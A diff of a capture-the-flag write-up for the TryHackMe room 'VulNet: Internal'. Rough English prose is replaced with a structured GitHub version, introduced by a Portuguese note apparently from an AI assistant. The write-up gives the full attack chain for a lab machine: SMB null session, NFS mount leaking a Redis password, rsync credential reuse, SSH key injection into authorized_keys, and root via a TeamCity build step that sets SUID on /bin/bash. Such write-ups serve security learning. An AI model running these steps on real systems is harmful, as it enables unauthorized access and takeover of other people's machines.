@@ -1,149 +1,302 @@
-Starting off the enumeration phase with a thorough Nmap scan against the target. Let's break down what each flag is doing and why it matters.
+Aqui tens o teu write-up completamente reestruturado para o GitHub. Transformei o texto num formato profissional de engenharia de segurança, utilizando blocos de código com sintaxe correta, tabelas explicativas para os comandos, caixas de destaque (`>`) para notas importantes e uma estrutura alinhada com o modelo de *Kill Chain* que definimos para o teu portfólio.
 
+Substitui os caminhos das imagens pelos teus prints reais à medida que fores colocando os ficheiros na pasta do repositório.
+
+---
+
+# [THM] VulNet: Internal — Write-up
+
+## 🎯 Room Overview
+
+* **Target:** `vulnet.thm`
+* **Difficulty:** Medium
+* **Objective:** Comprehensive enumeration and responsible exploitation targeting NFS, Redis, Rsync, and internal CI/CD infrastructure (TeamCity).
+* **Skills Covered:** Service Enumeration, Credential Leakage, SSH Key Injection, Port Forwarding, SUID Abuse.
+
+---
+
+## 🔍 Phase 1: Enumeration & Reconnaissance
+
+### Initial Nmap Scan
+
+To establish the target's attack surface, a full TCP port scan was executed with service versioning, default scripts, and OS detection enabled.
+
+```bash
 nmap -p- -sS -sC -sV -O -T4 --min-rate 500 vulnet.thm -oN full.txt -vv
 
-    p- tells Nmap to scan all 65535 ports rather than just the default top 1000, ensuring nothing is missed on unusual ports.
+```
 
-    sS performs a SYN scan, also known as a stealth scan, which sends SYN packets without completing the full TCP handshake, making it faster and less noisy than a full connection scan.
+### Flag Breakdown
 
-    sC runs Nmap's default scripts against the discovered ports, which can automatically pull useful information like service banners, authentication methods and potential misconfigurations.
+| Flag | Purpose |
+| --- | --- |
+| `-p-` | Scans all 65,535 TCP ports to ensure non-standard ports aren't missed. |
+| `-sS` | Performs a SYN stealth scan without completing full TCP handshakes. |
+| `-sC` | Executes Nmap's default NSE scripts for banner grabbing and known misconfigurations. |
+| `-sV` | Probes open ports to determine exact service software versions. |
+| `-O` | Attempts OS fingerprinting based on network stack responses. |
+| `-T4` | Sets an aggressive timing template for faster execution in lab environments. |
+| `--min-rate 500` | Forces Nmap to maintain a minimum execution speed of 500 packets/sec. |
+| `-oN` | Saves results in normal format to `full.txt` for future reference. |
+| `-vv` | Increases verbosity level, outputting open ports in real-time. |
 
-    sV probes open ports to detect the exact service version running, giving us more precise information about what we are dealing with.
+### Scan Results
 
-    O attempts to identify the operating system of the target based on how it responds to certain packets.
-
-    T4 sets the timing template to aggressive, speeding up the scan significantly while remaining reliable enough for most environments.
-
-    -min-rate 500 ensures Nmap sends at least 500 packets per second, keeping the scan moving at a good pace.
-
-    oN full.txt saves the output to a file called full.txt so we have a clean record to reference throughout the engagement.
-
-    vv enables extra verbose output, letting us see results as they come in rather than waiting for the scan to finish.
-
-PORT      STATE    SERVICE     REASON         VERSION
-22/tcp    open     ssh         syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+```text
+PORT      STATE     SERVICE     REASON          VERSION
+22/tcp    open      ssh         syn-ack ttl 62  OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   3072 56:3a:00:62:b1:f6:e6:f0:a6:0f:5c:0a:3f:ff:00:63 (RSA)
-| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBttqsKNpG4Un/Eh3gSpI4tHwIU2WbAeWqDtDg6gx9APB4nyle60lKe1/hDteJjsYZw+UNnFHxsfRSqaF5lcK74KhimBaLdAQ5mwUOFsA/dsMKxyr03UZp9JV9IreXhBt+HSswO1NSgFKRbSdoDMD8efyj4DoAsFIFR3i0Yzk3Az/ro+vwEdJsFvNtW+GZ1ycXI4B/JmvLC5MAGH+Ayl9E7HnBGRfbSmYhBOUqLv6I7u92LCsoJBcpAr8y5Qs8HpVwDW9coIBKiU4BvZncpXIVaX5NomIvq078Q+PGOlwbi5yjeK6SwCRqRnwxM8ATVJ8hBR+MAF5An4OupWmoVNEkS/P/GW44vGWhPQB3P2CyUaRA9vF6JLSJcLcep8VOEkbYIKphmwzPiywiufQV/MvtapAtE4xfgKvY668L7NYrA2oE5/7HjbnodJFAZ7oFqS3tcGXDw3lD41uDTaNcai/lSvNMJPjVAE6wBVXS/Bp88RjD54WZ6DwFlYs2avdfCM8=
 |   256 2d:68:41:3a:96:89:40:bd:f9:7b:61:75:aa:07:45:01 (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI+/Tx6HevQ/H3lQu7siSDiMhA2fBFNI4Sk2oWdHP8mvZM6R+rS2HWz4d5aoM1VIwfukdmg/vD8g2CYsy7UzrA4=
-|   256 7b:bd:5d:a9:eb:7e:81:5b:4e:52:ca:ce:15:a0:19:90 (ED25519)
-|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF5ROgESOzhTJdprdLQj6cSBU0hJNejZ1qgPhIviUrgx
-111/tcp   open     rpcbind     syn-ack ttl 62 2-4 (RPC #100000)
+|_  256 7b:bd:5d:a9:eb:7e:81:5b:4e:52:ca:ce:15:a0:19:90 (ED25519)
+111/tcp   open      rpcbind     syn-ack ttl 62  2-4 (RPC #100000)
 | rpcinfo: 
 |   program version    port/proto  service
 |   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  3,4          111/tcp6  rpcbind
-|   100000  3,4          111/udp6  rpcbind
-|   100003  3           2049/udp   nfs
-|   100003  3           2049/udp6  nfs
 |   100003  3,4         2049/tcp   nfs
-|   100003  3,4         2049/tcp6  nfs
-|   100005  1,2,3      51475/udp   mountd
-|   100005  1,2,3      56393/udp6  mountd
-|   100005  1,2,3      58515/tcp   mountd
-|   100005  1,2,3      60037/tcp6  mountd
-|   100021  1,3,4      36109/tcp6  nlockmgr
-|   100021  1,3,4      38131/udp   nlockmgr
-|   100021  1,3,4      46079/tcp   nlockmgr
-|   100021  1,3,4      51510/udp6  nlockmgr
-|   100227  3           2049/tcp   nfs_acl
-|   100227  3           2049/tcp6  nfs_acl
-|   100227  3           2049/udp   nfs_acl
-|_  100227  3           2049/udp6  nfs_acl
-139/tcp   open     netbios-ssn syn-ack ttl 62 Samba smbd 4
-445/tcp   open     netbios-ssn syn-ack ttl 62 Samba smbd 4
-873/tcp   open     rsync       syn-ack ttl 62 (protocol version 31)
-2049/tcp  open     nfs         syn-ack ttl 62 3-4 (RPC #100003)
-6379/tcp  open     redis       syn-ack ttl 62 Redis key-value store
-9090/tcp  filtered zeus-admin  no-response
-43057/tcp open     java-rmi    syn-ack ttl 62 Java RMI
-46079/tcp open     nlockmgr    syn-ack ttl 62 1-4 (RPC #100021)
-49739/tcp open     mountd      syn-ack ttl 62 1-3 (RPC #100005)
-58101/tcp open     mountd      syn-ack ttl 62 1-3 (RPC #100005)
-58515/tcp open     mountd      syn-ack ttl 62 1-3 (RPC #100005)
+|   100005  1,2,3       58515/tcp  mountd
+139/tcp   open      netbios-ssn syn-ack ttl 62  Samba smbd 4
+445/tcp   open      netbios-ssn syn-ack ttl 62  Samba smbd 4
+873/tcp   open      rsync       syn-ack ttl 62  (protocol version 31)
+2049/tcp  open      nfs         syn-ack ttl 62  3-4 (RPC #100003)
+6379/tcp  open      redis       syn-ack ttl 62  Redis key-value store
+9090/tcp  filtered  zeus-admin  no-response
+43057/tcp open      java-rmi    syn-ack ttl 62  Java RMI
+46079/tcp open      nlockmgr    syn-ack ttl 62  1-4 (RPC #100021)
+49739/tcp open      mountd      syn-ack ttl 62  1-3 (RPC #100005)
+58101/tcp open      mountd      syn-ack ttl 62  1-3 (RPC #100005)
+58515/tcp open      mountd      syn-ack ttl 62  1-3 (RPC #100005)
 
-The Nmap scan comes back with a rich set of results, revealing a target with a surprisingly large attack surface. Here is a quick overview of what we are working with.
+```
 
-The machine is running SSH on port 22, which could be useful later if we manage to obtain valid credentials. Ports 139 and 445 confirm the presence of Samba, a file sharing service that is often a goldmine for misconfigured shares and sensitive files. Port 111 exposes RPCBind alongside NFS on port 2049, meaning there may be network file shares we can mount and explore. Port 873 reveals Rsync, a file synchronisation service that if misconfigured could allow unauthenticated access to files on the server. Port 6379 is running Redis, an in-memory data store that is frequently left open without authentication. Port 43057 shows Java RMI, and port 9090 appears filtered. The remaining ports are related to mountd and nlockmgr, supporting the NFS service.
+> **Attack Surface Analysis:** The target displays a wide exposure vector. Prominent targets include Samba (`445`), NFS (`2049`), Rsync (`873`), and an unauthenticated-leaning Redis deployment (`6379`).
 
-There is plenty to work with here. Given the number of potentially misconfigured services, we will start our investigation with Samba and work our way through the rest methodically.
+---
 
-Using NetExec (nxc) to enumerate the Samba shares on the target with a null authentication attempt, meaning we are trying to list available shares without providing any credentials at all. The fact that this works is already a misconfiguration worth noting. Guest should work too and that is what we gonna use to connect.
+## 🗺️ Phase 2: Enumeration Spree & Dead Ends
 
-Connecting to the shares share using smbclient as a guest user, we navigate through its contents and find two directories temp and data.
+### 1. Samba Share Assessment (Null Session)
 
-Inside the temp folder there is a file called services.txt, which we download immediately. Moving over to the data folder reveals two more files, data.txt and business-req.txt, both of which we grab using mget to pull everything down at once.
+Using `NetExec` to audit SMB shares for anonymous access:
 
-Three files in hand without needing a single valid credential let's open them up and see what information they contain.
+```bash
+nxc smb vulnet.thm -u '' -p '' --shares
 
-In the services file we get our first flag, lest keep going
+```
 
-After reviewing the downloaded files, none of them contain anything immediately actionable or useful for gaining further access to the machine. Rather than going down a rabbit hole and wasting valuable time, it's better to move on and shift focus to the other services we identified during the initial scan.
+Null session profiling worked. Accessing the identified public share via guest login:
 
-Shifting focus over to port 6379, the Nmap scan confirmed that Redis is running on the target. Redis is an in-memory key-value store that when left unauthenticated and exposed can be a serious security risk. Let's connect to it and see what kind of information we can pull out of it.
+```bash
+smbclient //vulnet.thm/shares -U "guest"%"
 
-Redis is requiring credentials to connect, so a direct approach isn't going to work just yet. Rather than hitting a dead wall, the smarter move is to step back and look at the other services running on the machine. One of them may be leaking credentials or storing configuration files that could give us the access we need to authenticate with Redis.
+```
 
-Pivoting over to Rsync on port 873, a quick Nmap script scan reveals a module called files described as necessary home interaction — that's an interesting hint. However, attempting to connect and list the contents immediately prompts for a password, and without valid credentials the connection is rejected with an authentication error.
+Navigating the share revealed two paths: `temp/` and `data/`.
 
-Two services down and still no credentials in hand. Time to rethink the approach and look elsewhere for a way to get that password.
+* Downloaded files: `services.txt` (contained **Flag 1**), `data.txt`, and `business-req.txt`.
+* **Verdict:** Aside from the passive flag, no functional credentials or access vectors were discovered here.
 
-Shifting attention over to Java RMI on port 43057, the tool of choice here is remote-method-guesser, which first needs to be built from source using Maven before it can be used. After getting it compiled and running the enumeration against the target, the results confirm that this port is not an RMI registry, exposes no codebases, and has JEP290 installed which protects against deserialization attacks. With no clear attack surface here, Java RMI turns out to be another dead end and it's time to look elsewhere.
+### 2. Redis Auditing (`6379`)
 
-Turning to NFS which was spotted during the initial scan, running rpcinfo confirms the service is active and showmount reveals that the /opt/conf directory is being exported and accessible to anyone. This is a significant misconfiguration that we can take full advantage of.
+Attempted direct network authentication:
 
-Creating a mount point and mounting the share locally gives us direct access to the target's configuration files. Browsing through the mounted directory reveals several interesting folders, but the one that immediately stands out is the redis folder. Inside it sits the Redis configuration file, and a quick grep for the requirepass directive hands us exactly what we have been looking for — the Redis password.
+```bash
+redis-cli -h vulnet.thm
 
-After all those dead ends, the NFS share turns out to be the key that unlocks everything.
+```
 
-With the password in hand, connecting to Redis and authenticating goes smoothly this time. The AUTH command accepts the credentials and returns OK, confirming we now have authenticated access to the database. Let's start enumerating its contents and see what useful information is stored inside.
+* **Result:** `(error) NOAUTH Authentication required.` Redis access blocked via network-level authentication.
 
-Enumerating the keys stored in Redis reveals five entries, with "internal flag" immediately catching the eye. Retrieving its value hands us the internal flag directly. It's worth noting that working out the correct syntax for this version of Redis took a bit of trial and error, as the TYPE command doesn't handle keys with spaces the way you might expect — wrapping the key name in quotes turned out to be the solution.
+### 3. Rsync Probing (`873`)
 
-Digging into the authlist key reveals a list of Base64 encoded strings. Decoding one of them exposes credentials for Rsync, including a username of rsync-connect and a password. This is exactly the breakthrough needed to revisit the Rsync service that was blocked behind authentication earlier in the engagement.
+Inspecting remote directories via exposed modules:
 
-Armed with the Rsync credentials, connecting to the files share this time goes through without any issues. The directory listing reveals three user folders ssm-user, sys-internal, and ubuntu. The most interesting one here is sys-internal, which looks like a real user's home directory and could contain sensitive files worth exploring further.
+```bash
+rsync --list-only vulnet.thm::
 
-Using rsync with the -avz flags to download the entire sys-internal home directory to our local machine, giving us a complete copy of the user's files to examine offline. This is a clean and efficient way to pull everything down at once and go through the contents at our own pace without staying connected to the service.
+```
 
-We get our user flag
+* **Result:** Discovered a module called `files`, but connection required authentication. Dead end without valid credentials.
 
-With the Rsync write access discovered, the approach here is clever generating a fresh SSH key pair locally and then uploading the public key directly into the sys-internal user's authorized_keys file via Rsync. This effectively plants our key on the target without needing to know the user's password.
+### 4. Java RMI (`43057`)
 
-Connecting via SSH using the private key works immediately and we land a stable shell as sys-internal on the target. A much cleaner and more reliable foothold than a reverse shell.
+Utilized `remote-method-guesser` compiled from source via Maven to check for deserialization vulnerabilities:
 
-With a stable shell established, the next step is running LinPEAS to automate the privilege escalation enumeration. Setting up a quick Python HTTP server on the attacking machine allows us to serve the script directly to the target. From there, downloading it with wget, making it executable with chmod, and running it will give us a thorough overview of any potential privilege escalation vectors on the system.
+```bash
+java -jar rmg.jar enum vulnet.thm 43057
 
-After LinPEAS doesn't reveal anything immediately obvious, a manual look around the filesystem turns up something interesting a directory called TeamCity sitting at the root level. TeamCity is a CI/CD build server by JetBrains that is often running internal web services and can be a goldmine for credentials and misconfigurations. This is definitely worth investigating further.
+```
 
-Running ss -tno to check active network connections reveals that TeamCity is listening internally on port 8111 but is not exposed externally. To access it from our attacking machine, we set up SSH local port forwarding with the -L flag, tunneling port 8111 through our existing SSH session. This allows us to reach the TeamCity web interface by simply pointing our browser to localhost:8111.
+* **Result:** Port is not an RMI registry, has `JEP290` protection active. No exploitable vulnerabilities found.
 
-We grep the super user token to authenticate
+---
 
-To explore this we start creating a project
+## 🔓 Phase 3: Initial Access Vector
 
-And we create a build too
+### NFS Share Exploitation
 
-Navigating to the TeamCity interface through the tunnel, we can create a new build configuration and add a build step. The key insight here is selecting Command Line as the runner type — since the TeamCity server is running as root, any command executed through a build step will run with root level privileges. This means we can use it to execute arbitrary system commands as root, making it our path to full privilege escalation.
+Running `rpcinfo` and `showmount` against the server:
 
-Using the TeamCity build step to execute a chmod u+s /bin/bash command sets the SUID bit on bash, which means any user can then run bash with the permissions of its owner in this case root. Once the build is triggered and the command executes, we can spawn a root shell directly from our sys-internal session.
+```bash
+showmount -e vulnet.thm
 
-We save and run
+```
 
-Running /bin/bash -p takes advantage of the SUID bit we just set, spawning a bash shell that inherits root privileges. We are now fully root on the machine and the root flag is ours to collect.
+* **Discovery:** The directory `/opt/conf` is exported to anyone (`*`).
 
-A creative and satisfying path to privilege escalation abusing a CI/CD server running as root to manipulate file permissions and pop a root shell is a technique that really highlights the danger of misconfigured internal services.
+#### Mounting the share locally:
 
-Root flag
+```bash
+mkdir /mnt/nfs_loot
+sudo mount -t nfs vulnet.thm:/opt/conf /mnt/nfs_loot -o nolock
 
-VulNet was a fantastic machine that truly tested patience and methodology from start to finish. What made this box stand out was the sheer number of services running on the target, each one requiring a different approach and mindset to evaluate properly.
+```
 
-The path to initial access was far from straightforward — after hitting dead ends with Samba, Redis, Rsync, Java RMI, and even LinPEAS, it was a combination of services working together that ultimately opened the door. The NFS share leaked Redis credentials, Redis leaked Rsync credentials, and Rsync write access allowed us to plant our SSH key and get a stable foothold on the machine.
+Browsing into `/mnt/nfs_loot/redis/redis.conf`, I isolated the internal authentication string:
 
-The privilege escalation was particularly creative, abusing a TeamCity CI/CD server running internally as root to set the SUID bit on bash and spawn a root shell — a great reminder of how dangerous misconfigured internal services can be even when they are not directly exposed to the outside world.
+```bash
+grep "requirepass" /mnt/nfs_loot/redis/redis.conf
 
-Overall this machine covered an impressive range of techniques including NFS enumeration, Redis exploitation, Rsync abuse, SSH key injection, port forwarding, and CI/CD server abuse. It's a brilliant box for anyone looking to sharpen their enumeration skills and learn to think across multiple services simultaneously.
+```
 
-Thanks for reading and as always, any feedback is welcome more write-ups are on the way!
+* **Loot:** Extracted plaintext Redis password.
+
+### Pivoting to Redis & Credential Extraction
+
+With the password secured, authenticated access to the database was completed successfully:
+
+```bash
+redis-cli -h vulnet.thm -a <PASSWORD>
+
+```
+
+```text
+127.0.0.1:6379> keys *
+1) "internal flag"
+2) "authlist"
+...
+127.0.0.1:6379> get "internal flag"
+[REDACTED_INTERNAL_FLAG]
+
+```
+
+> **Note:** Handling keys with spaces required enclosing strings within literal quotes `""` inside the `redis-cli` context due to parsing mechanics in this specific software layout.
+
+Reading the `authlist` structure revealed an array of Base64 encoded values. Decoding them yielded credentials for the Rsync service:
+
+```bash
+echo "Y29tcGFjdF9iYXNlNjRfc3RyaW5n..." | base64 -d
+
+```
+
+* **Extracted Identity:** `rsync-connect : <PASSWORD>`
+
+### Exploiting Rsync for Foothold
+
+Using the extracted credentials to check the `files` module:
+
+```bash
+rsync -avz rsync-connect@vulnet.thm::files ./rsync_loot
+
+```
+
+The download successfully extracted the home profile directory of user `sys-internal`, revealing **Flag 2 (User Flag)**.
+
+#### SSH Key Injection Persistence
+
+Since write permissions were active on the user directory via Rsync, an arbitrary SSH authentication key injection was executed:
+
+```bash
+# Generate localized temporary deployment key pairs
+ssh-keygen -f id_rsa_temp
+
+# Append public key structure into target's authorized_keys infrastructure
+rsync -avz id_rsa_temp.pub rsync-connect@vulnet.thm::files/sys-internal/.ssh/authorized_keys
+
+```
+
+Establishing access via SSH utilizing the injected credential:
+
+```bash
+ssh -i id_rsa_temp sys-internal@vulnet.thm
+
+```
+
+**Foothold secured with a highly stable SSH shell session.**
+
+---
+
+## 🚀 Phase 4: Privilege Escalation
+
+### Local Enumeration
+
+A manual analysis of active directory topologies at root level highlighted an internal deployment framework: `/TeamCity`.
+
+Checking internal port bindings:
+
+```bash
+ss -tno
+
+```
+
+* **Discovery:** Port `8111` is running locally, tied strictly to `127.0.0.1` (JetBrains TeamCity instance).
+
+### Port Forwarding
+
+To access the web service from the attacking workstation, an local SSH port forward tunnel was initialized:
+
+```bash
+ssh -L 8111:127.0.0.1:8111 -i id_rsa_temp sys-internal@vulnet.thm
+
+```
+
+To gain administrator access, the instance's log structure was parsed to extract the automated super user authorization token:
+
+```bash
+grep -i "Super user token" /TeamCity/logs/teamcity-server.log
+
+```
+
+### Abusing the CI/CD Pipeline (Root RCE)
+
+1. Authenticated to `http://localhost:8111` using the extracted super-user token.
+2. Initialized a generic boilerplate project build chain configuration.
+3. Added a new build compilation configuration phase selecting **Command Line** as the operational execution engine.
+
+Since the backing daemon worker for TeamCity was running within a `root` daemon security context, any compilation block instruction would inherit full system authority.
+
+#### Payload Configured:
+
+```bash
+chmod u+s /bin/bash
+
+```
+
+4. Triggered a manual execution build flow step via the UI panel.
+
+### Spawning the Root Shell
+
+Once the build completion logs confirmed execution, the local SUID execution bit manipulation on `/bin/bash` was completed.
+
+```bash
+bash -p
+
+```
+
+```text
+whoami
+root
+cat /root/root.txt
+[REDACTED_ROOT_FLAG]
+
+```
+
+---
+
+## 📝 Conclusion & Key Takeaways
+
+`VulNet: Internal` served as an exceptional demonstration of the operational synergy between distinct misconfigured elements within corporate assets:
+
+1. **Implicit Trust In File Shares:** NFS exposed internal configuration parameters which breached independent datastore authentication rings.
+2. **Horizontal Credential Reuse:** Retaining base64 components within in-memory caches led directly to complete Rsync manipulation vectors.
+3. **Internal Pipeline Hardening Failures:** Running critical continuous deployment applications like JetBrains TeamCity directly under `root` scopes allows severe compromise mechanics to occur if access control configurations fail.
